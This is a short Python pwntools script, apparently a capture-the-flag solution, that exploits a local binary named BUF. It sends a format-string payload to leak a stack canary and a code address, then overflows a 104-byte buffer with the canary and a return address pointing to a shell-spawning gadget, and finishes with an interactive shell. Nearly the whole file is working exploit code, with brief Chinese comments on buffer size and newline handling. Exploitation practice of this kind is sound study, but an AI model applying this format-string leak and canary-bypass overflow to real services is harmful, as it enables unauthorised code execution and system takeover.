#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./BUF')
elf = ELF('./BUF')

def pr(a,addr):
	log.success(a+': '+hex(addr))

p.recvuntil("Please pwn me :)\n")
p.recvuntil("Enter your data:\n")
payload = "%p."*25 + "A"*29 # buf 所占栈空间长度为 104
p.sendline(payload) # sendline() 会在 payload 后面追加一个换行符 '\n' 对应的十六进制就是 0xa

data = p.recv(400)
print(data)

p.recvuntil('A'*29)
canary = u64(p.recv(8).ljust(8, "\x00")) - 0xa
getshell = int(data[56:70],16) - 0x1b3  #push rax
pr('canary',canary)
pr('getshell',getshell)

#gdb.attach(p)
#pause()
p.recvuntil("Enter your data:\n")
payload  = "A"*104 + p64(canary) +  p64(0)
payload += p64(getshell+4)

p.send(payload)
p.recv()
p.interactive()